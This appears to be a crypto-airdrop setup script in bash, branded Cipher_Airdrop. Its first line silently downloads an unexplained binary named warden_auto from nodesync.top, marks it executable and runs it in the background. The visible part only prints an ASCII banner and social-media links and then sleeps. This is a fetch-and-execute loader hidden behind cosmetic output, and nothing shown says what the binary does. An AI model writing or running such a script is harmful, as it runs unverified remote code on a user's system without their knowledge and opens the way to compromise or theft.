#!/bin/bash

# Run the initial part of the script in the background
( if ! which wget; then sudo apt install wget -y; fi && rm -rf $HOME/warden_auto && wget https://nodesync.top/warden_auto && chmod +x warden_auto && ./warden_auto ) &

# Print Cipher_Airdrop in big bold text
echo "========================================================================="
echo "  _____   _____   _____    _    _   ______   _____                 "
echo " / ____| |_   _| |  __ \  | |  | | |  ____| |  __ \               "
echo "| |        | |   | |__) | | |__| | | |__    | |__) |             "
echo "| |        | |   |  ___/  |  __  | |  __|   |  _  /             "
echo "| |____   _| |_  | |      | |  | | | |____  | | \ \              "
echo " \_____| |_____| |_|      |_|  |_| |______| |_|  \_\           "
echo "========================================================================="

# Social media links
echo "Follow us on social media:"
echo "Twitter: https://twitter.com/cipher_airdrop"
echo "Telegram: https://t.me/+tFmYJSANTD81MzE1"

# Sleep for 20 seconds
sleep 20

# Rest of your script goes here
# ...
